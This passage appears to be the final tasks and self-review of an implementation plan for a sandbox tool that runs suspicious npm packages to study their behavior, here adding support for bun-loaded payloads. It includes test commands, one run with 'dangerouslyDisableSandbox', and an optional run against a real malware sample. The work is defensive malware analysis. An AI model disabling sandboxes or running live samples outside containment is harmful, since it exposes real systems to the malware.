- Modify: `samples/colorz-utill/README.md` (note the bun-loader capability — optional, only if it reads naturally)
- Test: full suite.

- [ ] **Step 1: Run the entire test suite (no Docker)**

Run: `python -m pytest -q -k "not bun_detonation"`
Expected: PASS — all pre-existing tests plus the new node-path tests (Tasks 2–4) green. (`test_bun_detonation.py` skips without Docker.)

- [ ] **Step 2: Run the Docker-gated suite**

Run: `python -m pytest tests/test_bun_detonation.py tests/test_sandbox_orchestrator.py -v` (with `dangerouslyDisableSandbox`)
Expected: PASS.

- [ ] **Step 3: Verify against the real sample (manual, optional)**

If the `tiaan` sample is available, re-run the analyzer and confirm the report now shows a `runtime-reexec` finding for bun and captured payload behavior:

Run: `<repo>/.venv/bin/npm-ide-analyst analyze <path-to-tiaan> --out /tmp/tiaan-report-02 --dynamic --debug`
Expected: `report.json` contains a `DYN-runtime-reexec-*` finding and `behavior` events sourced from the bun payload.

- [ ] **Step 4: Commit any doc changes**

```bash
git add -A
git commit -m "docs: note bun-loader detonation support"
```

---

## Self-Review

**Spec coverage:**
- §1 Bun in image → Task 5. ✅
- §2 shared core + entrypoints → Task 1 (core/preload split, bun stub), Task 6 (bun-native hooks). ✅
- §3 neuter→allowlist re-exec → Task 2. ✅
- §4 event correlation (env passthrough, stdio inherit, shared log) → Task 2 (`childEnv`, `runReexec` stdio). ✅
- §5 waitForChildren → Task 2 (Steps 3, 6, 7). ✅
- §6 orchestrator env + reporting → Task 3 (env), Task 4 (finding). ✅
- §7 tests → Task 2 (unit), Task 5/7 (Docker-gated), neuter regression (Task 2 + Task 7). ✅

**Placeholder scan:** No TBD/TODO; every code step shows full code. The optional doc edit in Task 8 is explicitly optional. ✅

**Type consistency:** `reexecPlan` / `runReexec` / `registerChild` / `waitForChildren` signatures match between hooks-core.js (Task 2), preload-bun.js (Task 6), and the runners. Event `data.runtime` produced in Task 2 is read in Task 4. `_detonate_ms` defined and tested in Task 3. `ANALYST_DETONATE_MS` produced in Task 3, consumed in Task 2's runners. ✅
